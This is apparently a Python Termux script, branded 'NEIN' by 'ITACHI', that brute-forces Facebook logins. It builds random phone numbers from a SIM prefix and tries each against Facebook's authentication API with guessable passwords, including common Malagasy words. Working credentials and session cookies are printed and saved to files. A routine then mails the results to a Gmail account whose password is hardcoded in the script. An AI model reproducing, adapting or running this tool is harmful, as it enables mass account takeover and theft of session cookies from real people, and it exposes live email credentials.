import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#-------------color----------------#
bblack="\033[1;30m"         # Noir
M="\033[1;31m"            # Rouge
H="\033[1;32m"         # Vert
byellow="\033[1;33m"        # Jaune
bblue="\033[1;34m"          # Bleu
P="\033[1;35m"        # Violet
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # Blanc
my_color = [B, C, P, H]
warna = random.choice(my_color)

#-------------logo-----------------#
logo = (f'''{B}

 _____  ___    _______   __    _____  ___   
(\"   \|"  \  /"     "| |" \  (\"   \|"  \  
|.\\   \    |(: ______) ||  | |.\\   \    | 
|: \.   \\  | \/    |   |:  | |: \.   \\  | 
|.  \    \. | // ___)_  |.  | |.  \    \. | 
|    \    \ | (:      "| /\  |\|    \    \ | 
 \___|\____\) \_______)(__\_|_)\___|\____\) 
                                            

{warna}--------------------------------------------{B}
 Owner    : ITACHI
 TOOL NAME : NEIN
 GROUPE-FB   : [TERMUX-COMAND]
 Facebook : ITACHI SQ
 Tools    : {warna}[{H}VERSION 1{warna}]{warna}
--------------------------------------------{B}''')

#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')

#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)

#-------------main def------------#
def MR_ITACHI():
    clear()
    os.system('xdg-open https://github.com/MR-DIPTO-404')
    print(f'{B} [{warna}01{B}] RANDOM CLONING ')
    print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
    linex()
    option = input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
    if option in ['01','1']:
        BD_CLONING()
    else:
        exit(' Thanks for using dear :)')

#------------- bd clone def ----------#
def BD_CLONING():
    user = []
    clear()
    print(' EXAMPLE SIM CODE : [26132] [26134] [26138] [26133]')
    code = input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit = int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit = 50000
    clear()
    oks = []  # Initialisation de la liste pour stocker les identifiants OK
    cps = []  # Initialisation de la liste pour stocker les identifiants CP
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl = str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    send_email(oks, cps)  # <--- Ajout de l'envoi d'e-mail ici
    input(' PRESS ENTER TO BACK  : ')
    MR_ITACHI()

#------------ method crack def ---------#
def method_crack(ids, passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            datax = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header = {'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
            url = 'https://api.facebook.com/method/auth.login'
            reqx = requests.post(url, data=datax, headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid = reqx['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[ITACHI-OK] '+str(uid)+'|'+pas+'\033[1;37m')
                    coki = ";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/ITACHI-OK.txt', 'a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ITACHI-CP] '+ids+'|'+pas+'\033[1;37m')
                open('/sdcard/ITACHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                print('\r\r \033[1;37m[ITACHI-FAILED] '+ids+'|'+pas+'\033[1;37m')
    except:
        pass

# Fonction pour envoyer un email
def send_email(oks, cps):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        # Remplacez ces informations par celles de votre compte d'e-mail dédié
        server.login("asatermux@gmail.com", "Alicia2007")

        msg = MIMEMultipart()
        msg['From'] = "asatermux@gmail.com"
        msg['To'] = "asatermux@gmail.com"
        msg['Subject'] = "Résultats de l'attaque"

        body = ""
        for ok in oks:
            body += ok.replace(" ", "") + "\n"
        body += "\n"
        for cp in cps:
            body += cp.replace(" ", "") + "\n"

        msg.attach(MIMEText(body, 'plain'))

        server.sendmail("Rona@gmail.com", "Rona@gmail.com", msg.as_string())
        server.quit()
        print("Email envoyé avec succès!")
    except Exception as e:
        print("Erreur lors de l'envoi de l'email:", e)

# Appel de la fonction MR_ITACHI pour démarrer le script
MR_ITACHI()
